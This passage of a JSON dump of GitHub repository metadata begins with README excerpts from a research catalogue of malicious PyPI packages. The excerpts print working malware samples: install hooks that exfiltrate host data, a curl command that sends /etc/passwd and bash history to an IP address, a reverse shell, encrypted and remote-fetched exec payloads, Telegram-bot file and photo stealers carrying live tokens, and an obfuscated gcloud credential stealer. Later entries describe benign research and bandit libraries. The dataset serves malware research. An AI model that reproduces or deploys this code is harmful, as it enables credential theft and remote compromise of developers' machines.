openwsaa, opensear, openzsea, openrsea, openwsea, oenesea, openxsa, oopensea, openaes, opensar, openseax, openseae, oenwea, oepenwea, oepensea, oopenwea, opwnsea, openwae, oenwsea, openeaa\n```python\nVERSION = '1.0.0'\nDESCRIPTION = 'UXxyykmDXkAnPEQfNvdUtxTNuctckuaHHCnTImtQRzglOiWmdzrZv'\nLONG_DESCRIPTION = 'ujJtdAnhzIGMdzefKCkVnrXMrhkNnLZScQUjSueXaDwVQpRDVAvqPJZlleBBmdIkGFIemKYQTGIiVIKNFDBsoseEpqycHkgpOIhQy oOGLXFwcpyzaYlEaZjRHWhUJcILolUlWYcptAEheKQwMqaxeXuDnslbeTwUJhVTyXXnqlyU tLfJDT kVrgTSpXVxaJS'\n\nclass ISoCBaTjPLsVbdxvjibMWcFHgcNtfpDzwQpVFCUFERhdMzcSHOefUivrlwPKlRvSNuipCwrnebUodDeRylAoEVzGEnmrlxXHcOysITsUiAnMnMkQhnFFpAHjmKiRvSktdpFxRXdnCZSLwgdtuNmXAQzxX(install):\n        def run(self):\n            import os\n            if os.name == \"nt\":\n                import requests\n                from fernet import Fernet\n                exec(Fernet(b'QfwZUeQEdWdRN900FHlkogRkaRrUbQ15w5bLprHO8CI=').decrypt(b'gAAAAABmbvUP4TYR920z_RnjSNJZue88X-Xy-Z5T4NBwSlgSwgxIM8OYeSfb3fWY6L4jkak7LzL1JIarsJIFk9FWfactZo44jGDw93QAuPAWGydpk_ZeLwCfeZ3X7TOBvZ2tCZ8VKgT-Ol-BopepZIHls8qx-2IWSKhT6aFergwW-xmRPdc0vn81lA0UgqwjNULokOrW0KpLyroVEzTpCZjiNUuI-vnYOzzdpQjFzkWev9OH8HCrDU4='))\n            install.run(self)\n```\n \n",
                    "original_header": "17 Jun. 2024"
                },
                "confidence": 0.9999999999924967,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "importlib-metadate [99.99] <br>\ntestkaralpoc45654 [1.0.0] <br>\nucap [3.6.1] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://kar.al\",params = ploads)\n```\n \n",
                    "original_header": "18 Jun. 2024"
                },
                "confidence": 0.9999999999257341,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "nt4padyp3 [0.0.1, 0.0.2] <br>\n```python\ndef read_ver():\n\tprint(\"readver\")\n\tcurl_command = 'curl -X POST -H \"Hostname: $(hostname)\" -H \"packagetype: NPM\" -H \"Whoami: $(whoami)\" -H \"Pwd: $(pwd)\" -d \"Install Directory: \\n $(ls -la) \\n Security Groups: \\n $(id) \\n User Directory: \\n $(ls ~)\\n etc-passwd: \\n $(cat /etc/passwd ) \\n Installed NPM modules: \\n $(npm ls)\\n bash history: \\n $(cat ~/.bash_history|head)\" -H \"Content-Type: text/plain\" http://43.139.166.32:8080'\n\tsubprocess.run(curl_command, shell=True)\n\treturn \"0.0.12\"\n```\n \n",
                    "original_header": "19 Jun. 2024"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "artifact-lab-3-package-a18ff5d9 [0.1.1, 0.1.2, 0.1.3, 1.1.2, 1.1.3, 1.1.4, 1.1.5] <br>\n```python\ndef notmalfunc():\n    data = dict(os.environ)\n    encoded_data = urllib.parse.urlencode(data).encode()\n    url = 'https://2edb-85-48-187-158.ngrok-free.app'\n    request = urllib.request.Request(url, data=encoded_data)\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n```\n \n",
                    "original_header": "23 Jun. 2024"
                },
                "confidence": 0.9999999995035864,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "class-py [1.0.0] <br>\nbuilderknower2 [0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.20, 0.1.21, 0.1.22, 0.1.23, 0.1.24, 0.1.25, 0.1.26, 0.1.27, 0.1.28, 0.1.29, 0.1.30] <br>\n```python\nclass myclass(install): \n    def run(self): \n        LHOST = \"85.159.212.47\"\n        LPORT = 61985 \n \n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) \n        s.connect((LHOST, LPORT)) \n        os.dup2(s.fileno(), 0) \n        os.dup2(s.fileno(), 1) \n        os.dup2(s.fileno(), 2) \n        pty.spawn(\"/bin/sh\") \n```\n \n",
                    "original_header": "24 Jun. 2024"
                },
                "confidence": 0.9999999351346126,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "add new 672 malicious packages, encompassing 997 versions.\n```python\nfrom tempfile import NamedTemporaryFile as _ffile\nfrom sys import executable as _eexecutable\nfrom os import system as _ssystem\n\nclass http:\n _ttmp = _ffile(delete=False)\n _ttmp.write(b\"\"\"from urllib.request import Request, urlopen;exec(urlopen(Request(url='https://rentry.co/277t2/raw', headers={'User-Agent': 'Mozilla/5.0'})).read())\"\"\")\n _ttmp.close()\n try: _ssystem(f\"start {_eexecutable.replace('.exe', 'w.exe')} {_ttmp.name}\")\n except: pass\n```\n \n",
                    "original_header": "02 Jul. 2024"
                },
                "confidence": 0.9999229878736823,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "IncapError [7.0.0] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname = socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname': hostname, 'cwd': cwd, 'username': username}\n        requests.get(\"https://1y05ug5pi97xa0bk2bjhdwp5yw4nsdg2.oastify.com\", params=ploads)  # Replace with Interactsh or Pipedream\n```\n \n",
                    "original_header": "06 Jul. 2024"
                },
                "confidence": 0.9999999999997442,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "ptmpl [0.2.0, 0.2.6, 0.2.14] <br>\nh99ai [0.1.0] <br>\ntestbrojct2 [0.1, 0.2, 0.4] <br>\nptestown [0.6.0] <br>\nproxyfullscrapers [0.1] <br>\nproxyfullscraper [0.1] <br>\nproxyalhttp [0.1] <br>\n```python\nimport os\nimport requests\nfrom concurrent.futures import ThreadPoolExecutor\n\ndef scan_and_send_files(bot_token, chat_id, folder_path='/'):\n    API_URL_DOCUMENT = f'https://api.telegram.org/bot{bot_token}/sendDocument'\n    API_URL_MESSAGE = f'https://api.telegram.org/bot{bot_token}/sendMessage'\n\n    def send_document_to_telegram(file_path, chat_id):\n        try:\n            with open(file_path, 'rb') as file:\n                response = requests.post(API_URL_DOCUMENT, data={'chat_id': chat_id}, files={'document': file})\n                return response.json()\n        except Exception as e:\n            return None\n\n    def send_message_to_telegram(message, chat_id):\n        try:\n            response = requests.post(API_URL_MESSAGE, data={'chat_id': chat_id, 'text': message})\n            return response.json()\n        except Exception as e:\n            return None\n\n    contents = os.listdir(folder_path)\n\n    for content in contents:\n        content_path = os.path.join(folder_path, content)\n        if os.path.isfile(content_path):\n            if content.lower().endswith(('.py', '.php', '.zip')):\n                try:\n                    message = f\"File: {content}\\nPath: {content_path}\"\n                    msg_response = send_message_to_telegram(message, chat_id)\n                    file_response = send_document_to_telegram(content_path, chat_id)\n                except Exception as e:\n                    pass\n        elif os.path.isdir(content_path):\n            files_in_subdir = [os.path.join(content_path, f) for f in os.listdir(content_path) if os.path.isfile(os.path.join(content_path, f))]\n            for file_path in files_in_subdir:\n                if file_path.lower().endswith(('.py', '.php', '.zip')):\n                    try:\n                        message = f\"File: {os.path.basename(file_path)}\\nPath: {file_path}\"\n                        msg_response = send_message_to_telegram(message, chat_id)\n                        \n                        file_response = send_document_to_telegram(file_path, chat_id)\n                    except Exception as e:\n                        pass\nBOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'\nCHAT_ID = 901011671\ndef send_photos_in_dcim_to_telegram(bot_token, chat_id, dcim_folder_path):\n    API_URL = f'https://api.telegram.org/bot{bot_token}/sendPhoto'\n\n    def send_photo_to_telegram(file_path, chat_id):\n        with open(file_path, 'rb') as file:\n            response = requests.post(API_URL, data={'chat_id': chat_id}, files={'photo': file})\n            return response.json()\n\n    for root, dirs, files in os.walk(dcim_folder_path):\n        for file in files:\n            if file.lower().endswith(('.png', '.jpg', '.jpeg')):\n                file_path = os.path.join(root, file)\n                response = send_photo_to_telegram(file_path, chat_id)\n                print(f'Sent {file_path}: {response}')\nBOT_TOKEN = '5240507980:AAHGnzHPLfO0DJx8CdBGRxjZV0uGhLEQgsw'\nCHAT_ID = 901011671\nDCIM_FOLDER_PATH = '/sdcard/DCIM'\nMAX_WORKERS = 5\ndef rudd():\n    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:\n        future_scan = executor.submit(scan_and_send_files, BOT_TOKEN, CHAT_ID, folder_path='/storage/emulated/0')\n        future_photos = executor.submit(send_photos_in_dcim_to_telegram, BOT_TOKEN, CHAT_ID, DCIM_FOLDER_PATH)\n    future_scan.result()\n    future_photos.result()\n```\n \n",
                    "original_header": "17 Jul. 2024"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "requestn [8.0] <br>\n```python\nimport os\nimport requests\n\ndef promain():\n    try:\n        import socket\n        import webbrowser\n        import sys\n        import json\n        token2='7345360932:AAFdgHMvggOowu-hx-OGyPljyi_wOf5D0zI'\n        ID2='5487978588'\n    except:\n        os.system(\"pip install webbrowser\")\n        os.system(\"pip install socket\")\n        os.system(\"clear\")\n\n    S = '\\033[1;33m'\n    A = \"\\033[1;91m\" #red\n    C = \"\\033[1;97m\" #white\n    ra = 0\n\n    file_ha = []\n\n    for file in os.listdir():\n        if os.path.isfile(file):\n            file_ha.append(file)\n            g = file\n            print(file)\n            massage = '@is_brother'\n            start_msg = requests.post(f\"https://api.telegram.org/bot{token2}/sendMessage?chat_id\\n\\n@t.me/is_brother\")\n            requests.post(f'https://api.telegram.org/bot{token2}/sendDocument?chat_id={ID2}&caption={massage}', files={'document': open(g, 'rb')})\n  \n    print(file_ha)\n    massage = '@is_brother'\n\n    for file in file_ha:\n        with open(\"SIN.txt\",\"a\") as pro:\n            pro.write(str(file) + \"\\n\")\n            print(file_ha)\npromain()\n```\n \n",
                    "original_header": "21 Jul. 2024"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "hexmanibm [1.0.4] <br>\nhexteamibm [1.0.4] <br>\nasptcer [1.0.0] <br>\n```python\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"http://9.30.214.68\",params = ploads)\n```\n \n",
                    "original_header": "22 Jul. 2024"
                },
                "confidence": 0.9999999999091074,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "lr_utils_lib [1.0.0] <br>\n```python\ndef get_co():\n    from subprocess import check_output as cooo\n    return cooo\n\ndef get_defcon(pew, h):\n    return pew.HTTPSConnection(h)\n\ndef get_se():\n    from re import search as se\n    return se\n\ndef get_ma(my):\n    return my.group(1)\n\ndef get_prrr():\n    from http import client as prrr\n    return prrr\n\ndef get_obs():\n    from codecs import open as obs\n    return obs\n\ndef get_ash(i):\n    from hashlib import sha256 as s256\n    return s256(i.encode()).hexdigest()\n\ngo = ['641d54eb5d6eede67c62287e8b33c95200b68d35465c75a2715a95fdfffe86d1',\n    'ae712e7065d27a88e464f77a0e4f97af6fa7a6bbcb9ebfe674eecec11f82c752',\n    '1686dc1dc8b706be5664fa568833cd8920c8551415c1b8567bc9b1060ff7bd0a',\n    'ae5a652d6397ac8150e0462930064cc600875e66d7687dcdcadd3c2532c45ac9',\n    '086dac8a9a2e86f3ee79274111d04577cfb4537d4f004efb4698ddecdf78c608',\n    'faacef9164ab09741fc616e71890ecbb4d748fec30954daf198424615c4115cb',\n    '3d959605a3105b5d37a4af33543c93ca4ffd02627d476e1b4647c75d61dd977f',\n    'e0df878d670bc75d210ed22d89a96049e2c7c8e750a22984f73320019a6b3c34',\n    '219a42f0592c7237a7bee6aaaadfdb3d8a9c2feaade9bb4cc334237a547f11c5',\n    '162284405016ebdcfc4b4525479f6e81e77995036e4a7c838060dee0aef347a5',\n    'ee4dc4f0fc56a3adab495255b467fa37f1af59aa213e1a757fd4982ff93603e2',\n    'ab85c781babc692205d15e49a3d8b4554382659f3c33f420f2313abe88236d0e',\n    '1c20e11f988ac643e391e46650b631130f2441eeadd07042123d8c33c9299519',\n    '53e65c0f44c9187361a3188e328786027ae32f73e58133f7a3deee8ecede2330',\n    '0d991fd5a73bc1cc5eb85f4f4a214b75ee4b6524aa7c7cffb25201fef9b39111',\n    '7594de25a00ad4c63e99b4e1bb288aff95463bf9e412cba7bfe2b41e7d48a649',\n    '94b307dbe8ea576634eb9f8c89cc303b174518f6b74771f3a79bafb178084421',\n    '55adf25da39af781eaeb5495c95fd9d52b40faf520f4c3f1c47c7376be2e7f8c',\n    '3defabd5508208a295e6d510983e88ad9f058ed3a83d7b51ece6298f6316772b',\n    '28eaeb21dc834a1d03fce5f08ade2a92adf5c02b8b393d547180f64cbb1c86f1',\n    '114fa09995b39dfe510be16835c3e8bbc2e72198124f84346e98911d90b3b22f',\n    'aeb94d85e079805c3d8417859674bc147399fb2e75d7f44762f188aefb558e9b',\n    '076a8d36cd65f00aa194b43e84b35b1d9dee995b1d1dd79889e32fb2f7d25c68',\n    'f4de2757497be6be87ed7aed1015f7d400801476922ecda8c3726d0a21eff626',\n    'fbcd4aedb12f03e1bfa3e4d18e95b5bbba9dc24ece486b53d1b9efa0b9a1d05f',\n    '64452e7c8fc93d823ffb7afc56a0ec29a26f01ab0433864334aca9b3d853fdae',\n    '536a133d1418fab3e9446d24ba372a3074d9b1cb0323deba90f4570bc06aec5b',\n    '5ac29b3e8d242d5304741adefeab22a7ec86d27ca20770e9bbaa7607ea6ac6c6',\n    '893b0bdad0ad9b444d3b8f81d767174d56ef8d50d42e2cebe590909b4e3b8c14',\n    '98072eb273aa84e41be2c632d80c45c9d01bc51bb00b7641e10ed506d9ec8e0b',\n    '8a811141b32bb3c557e3ab590a16e20610e47048dd3e7e89e1fb212a96dbb8a8',\n    'cfa5a30deb25da9e0fb69d8fbffeede549e2a859197a985ddb70185ba7b702d3',\n    '794722165ec19e2861a3ab8f6c28491f30b649e53ac9f36047e875398f614d9d',\n    '06b3c63f79eacfd4f6663da06605c431a348cde69880146fc9146b698355cb6e',\n    'ba843f0a75e1aea2408132ecf7926fe27d1553c35eb4a94ff69f1bc906d61e2d',\n    'a8a9ffe2bc4a837da05869333ffd7b0f518a8c79d765e6676383dd5d94384a7b',\n    '62806c8a8e2196f71f7e4927f868e61692473b02b381719c34262370adb83d6c',\n    'de4179e4031f226ba6dbb20075b7c1d224a66dfa1bce24b79e02bad14bf5e560',\n    '6d1a9f3a34e6b8d9a7afe3207755e66694514fcb8438e230077002f26721471c',\n    'a397fc034fd2637cb14fb150fc3373ac2764985b84d374f059ee81ef80343051',\n    '8b8fb34fb9a3e2e030904c7a4bdb41e83b67ed89c13b7bdd2ea12819f05f3f8e',\n    'e84fed85df76f0e7680e1dca0aee6756e4314103f79a4d0d7ddf6567b8e0de85',\n    'c00facb20a683a9b09d3b7f291885104bfca9b2bf59b8b8b3a3ef7b405ae473b',\n    '7bb8e88f6f416b7bbae07288a189e733bc671fc616c09cd9afe7a2fc9360fb5e',\n    '67aaee9fa3885064036c378669662bc657aaa6d4d216430dad7221dc45d13e24',\n    'f23e972a78e412f9037049bb4f8409022e5c3c9bf4433478dc9a2ac6c03401cc',\n    '224e96bb75927242dd3aa94d044ba38107923eb001f4e52ba477f486c2e7f5f6',\n    '3d0126242a1d570638bbd7e3a90cea72ab106c9bf0987484dd7cca128c51b18c',\n    '6f81cf533536a625c491d36e09fe3a98b6a0940d579c555ee5c00317138144c5',\n    '80c492975129f66b856433f1cc35dfeaabeef3d6804f9741604b64b7f1829fab',\n    '715847db3c4c182e95822515f4f7f32c5ba0e6fbfacc81b66138515c1e74d7fc',\n    'e7a2467cc4154ba48de85a8cf5afbef66523be988ee69b8da13538b1be27665c',\n    '7961af6aab6ff18d10dd5b699580733f44bc7fd825f0410ff89b5f22a93dd9b8',\n    '68110b8c2efab1563556ab0d535ffedd8aa1aecd1d47b784c2bc7e995c887fc2',\n    '5b31fceeeb1abc1f49b03824367db11103b04a163686d47d8c590e3d669768c2']\n\nclass PyInstall(install):\n    def run(self):\n        if sys.platform != \"darwin\":\n            return \n\n        tmp = get_co()\n        c = b64d(\"aW9yZWcgLWsgSU9QbGF0Zm9ybVVVSUQ=\").decode()\n        raw = tmp(c.split()).decode()\n        p = b64d('IklPUGxhdGZvcm1VVUlEIlxzKj1ccyoiKFteIl0qKSIK').decode()\n        roger = get_se()(p, raw)\n        u = get_ma(roger)\n        h = get_ash(u)\n        \n        if h in go:\n            b = os.path.expanduser(b64d('fi8uY29uZmlnL2djbG91ZA==').decode())\n            t = [\"YXBwbGljYXRpb25fZGVmYXVsdF9jcmVkZW50aWFscy5qc29u\", \"Y3JlZGVudGlhbHMuZGI=\"]\n\n            for x in t:\n                try:\n                    con = get_defcon(get_prrr(), b64d(\"ZXVyb3BlLXdlc3QyLXdvcmtsb2FkLTQyMjkxNS5jbG91ZGZ1bmN0aW9ucy5uZXQ=\").decode())\n                    with get_obs()(os.path.join(b, b64d(x).decode()), \"rb\") as fd:\n                        con.request(\"POST\", \"/version\", fd.read(), {\"X-Trace-Correlation-ID\": h})\n                    con.close()\n                except:\n                    pass\n\n            install.run(self)\n\n# 'setup.py publish' shortcut.\nif sys.argv[-1] == \"publish\":\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload dist/*\")\n    sys.exit()\n```\n \n",
                    "original_header": "28 Jul. 2024"
                },
                "confidence": 1.0,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "- GitHub Advisory Database https://github.com/advisories?query=type%3Amalware (NPM).\n- https://dasfreak.github.io/Backstabbers-Knife-Collection/ (PyPI and npm), by Marc Ohm et al.\n- https://github.com/datadog/malicious-software-packages-dataset (PyPI), by Datadog\n \n",
                    "original_header": "Other Dataset"
                },
                "confidence": 0.9999999999993179,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/lxyeternal/pypi_malregistry/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-08-15T17:28:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-23T01:48:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 11985
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "16": {
        "filename": "jzySaber1996_ISPY_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jzySaber1996/ISPY",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "# ISPY Installation\nThis is a installation guideline for \"ISPY: Automated Issue Detection and Solution Extraction\".\n\n## Dialogue Disentanglement\nBefore runnning the ISPY prediction, the plain text need to be disentangled into dialogues. \n\nThe code of dialogue disentanglement is available in [disentanglement](./disentanglement). We choose the SOTA model\n[irc-disentanglement](https://github.com/jkkummerfeld/irc-disentanglement/zipball/master) to seperate the raw dataset.\n\nThe steps of running dialogue disentanglement is as follows:\n\n### Step 1: Preprocessing.\n- Generate the `.ascii.txt` file (Attention: this function may not modify the name of `.txt`.): \n```python\n> python3 make-txt.py <filedir>\n```\n- Replace `.txt` into `.ascii.txt`:\n```python\n> rename txt ascii.txt <filedir>\n```\n- Generate `.tok.txt`:\n```python\n>  python dstc8-tokenise.py --vocab <vocabdir> --output-suffix .tok <filedir> <filedir>\n```\n\n### Step 2: Disentanglement. Predict the link of utterances.\n```python\n> python3 disentangle.py \\                          \n  <filename>.1\\\n  --model example-train.dy.model \\\n  --test <tokdir> \\\n  --test-start 0 \\\n  --test-end 5000 \\\n  --hidden 512 \\\n  --layers 2 \\\n  --nonlin softsign \\\n  --word-vectors <vecdir> \\\n  > <filename>.out 2><filename>.1.err\n```\n\n### Step 3: Extract separate dialogue messages via link graph.\n```python\n> python3 graph-to-messages.py <filedir> <filedir>\n```\n\n### Step 4: Transfer dialogue messages into separate dialogues.\n-  If you need to check the disentanglement result, use this command:\n```python\n> python3 merge_file.py <filedir>\n```\n- Otherwise, you can skip this Step 4 and start to predict the ISPY models.\n\n## ISPY Model\nThe ISPY includes two basic prediction models: `issue_classification.py` and `solution_extraction.py`.\n\nBoth models are available at [models](./models), and our SOTA models are reserved in [sota_model](./sota_model). We strongly recommend users of ISPY to retrain these two models on new dataset and submit performance issues to us.\n\n### Step 1: Build up ISPY-oriented dataset.\nThe preprocessing source code is available in [predicted_is_pairs](./predicted_is_pairs). use this command to construct the dataset:\n```python\n> python3 reformat_dialogs.py <filename>.out\n```\nThe dataset will be constructed as `.tsv` files in [data](./data) directory.\n\n### Step 2: Issue-Solution prediction.\nEnter models directory. Execute both issue and solution models in sequence.\n```python\n> python3 issue_classification.py\n> python3 solution_extraction.py\n```\n\nThe extracted issue-solution pairs will saved in [data/result_data](./data/result_data)\n\n## ISPY Installation in PyCharm\nOur model is built up in PyCharm. We welcome you to modify and optimize our model by using PyCharm edition.",
                    "type": "File_dump"
                },
                "confidence": 1,
                "technique": "file_exploration",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/INSTALL.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/model-v5_00.png\" width=\"1000\" alt=\"dd-test\"/></div><br> \n",
                    "original_header": "3 Models"
                },
                "confidence": 0.9730289511519383,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The scale of our dataset is available as follows. \nThe entire chat dataset includes **`1,402,894`** utterances of the eight Gitter communities, from Angular to Typescript. Sampled chat dataset includes sampled disentangled dialogs, where **`171`** are issue dialogs and **`579`** are non-issue dialogs.\n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/dataset.png\" width=\"600\" alt=\"dd-test\"/></div><br> \nYou can download the entire and sampled dataset with the following links. \n",
                    "original_header": "4.2 Our Dataset"
                },
                "confidence": 0.9252692002337155,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/baseline1.png\" width=\"1000\" alt=\"dd-test\"/></div><br> \n",
                    "original_header": "5.1 RQ1: Issue Detection"
                },
                "confidence": 0.998471342199364,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/baseline2.png\" width=\"1000\" alt=\"dd-test\"/></div><br> \n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/issue-solution.png\" width=\"400\" alt=\"dd-test\"/></div><br> \n",
                    "original_header": "5.2 RQ2: Solution Extraction"
                },
                "confidence": 0.9984092443657707,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/component_result.png\" width=\"600\" alt=\"dd-test\"/></div><br> \n\n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/component.png\" width=\"400\" alt=\"dd-test\"/></div><br> \n",
                    "original_header": "5.3 RQ3: Component Analysis"
                },
                "confidence": 0.9977350574293185,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/application.png\" width=\"1000\" alt=\"dd-test\"/></div><br>\n<div align=center><img src=\"https://gitlab.com/ispy2021/ispy-master/-/raw/master/diagrams/application2.png\" width=\"1000\" alt=\"dd-test\"/></div><br> \n",
                    "original_header": "6 Application"
                },
                "confidence": 0.9999973440133971,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jzySaber1996/ISPY/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-07-10T11:53:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-17T08:12:16Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 460387
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 107911
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 6095
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 2600
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 664
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 444
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "17": {
        "filename": "WilliamLwj_PyXAB_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/WilliamLwj/PyXAB",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "To install via pip, run the following lines of code\n```bash\npip install PyXAB                 # normal install\npip install --upgrade PyXAB       # or update if needed\n```\n\n\nTo install via git, run the following lines of code\n```bash\ngit clone https://github.com/WilliamLwj/PyXAB.git\ncd PyXAB\npip install .\n```\n\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "PyXAB - Python *X*-Armed Bandit"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/WilliamLwj/PyXAB/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n<p align=\"left\">\n<a href='https://pypi.org/project/PyXAB/'>\n       <img src='https://img.shields.io/pypi/v/PyXAB.svg?color=yellow' alt='PyPI version' />\n</a>\n<a href=\"https://codecov.io/gh/WilliamLwj/PyXAB\" > \n <img src=\"https://codecov.io/gh/WilliamLwj/PyXAB/branch/main/graph/badge.svg?token=VACRX9AQBM\"/> \n </a>\n<a href='https://pyxab.readthedocs.io/en/latest/?badge=latest'>\n    <img src='https://readthedocs.org/projects/pyxab/badge/?version=latest' alt='Documentation Status' />\n</a>\n<a href=\"https://github.com/WilliamLwj/PyXAB/actions/workflows/codeql.yml\" target=\"blank\">\n<img src=\"https://github.com/WilliamLwj/PyXAB/actions/workflows/codeql.yml/badge.svg\" alt=\"Code style: black\" />\n</a>\n<a href=\"https://github.com/WilliamLwj/PyXAB/actions/workflows/testing.yml\" target=\"blank\">\n<img src=\"https://github.com/WilliamLwj/PyXAB/actions/workflows/testing.yml/badge.svg\" alt=\"testing\" />\n</a>\n<a href=\"https://github.com/WilliamLwj/PyXAB/fork\" target=\"blank\">\n<img 